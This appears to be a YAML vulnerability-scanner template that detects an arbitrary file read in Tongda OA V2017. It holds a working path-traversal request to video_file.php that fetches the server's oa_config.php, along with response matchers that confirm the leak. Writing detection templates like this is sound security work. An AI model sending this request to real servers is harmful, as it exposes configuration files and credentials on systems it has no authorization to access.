id: "tongda-video-file-read"
name: "Tongda OA V2017 Video File - Arbitrary File Read"
severity: "medium"
description: "There is an arbitrary file reading vulnerability in Extreme OA video_file.php. An attacker can obtain sensitive files on the server through the vulnerability."
tech:
  - "php"
tags:
  - "tongda"
  - "lfi"
  - "vuln"
reference: "http://wiki.peiqi.tech/wiki/oa/%E9%80%9A%E8%BE%BEOA/%E9%80%9A%E8%BE%BEOA%20v2017%20video_file.php%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E.html"
spaExclusion: true
request:
  method: "GET"
  path: "/general/mytable/intel_view/video_file.php?MEDIA_DIR=../../../inc/&MEDIA_NAME=oa_config.php"
control:
  method: "GET"
  path: "/.guardian-none-{{rand}}"
matchers-condition: "and"
matchers:
  - type: "word"
    part: "body"
    words:
      - "$ROOT_PATH"
      - "$ATTACH_PATH"
  - type: "status"
    status:
      - 200
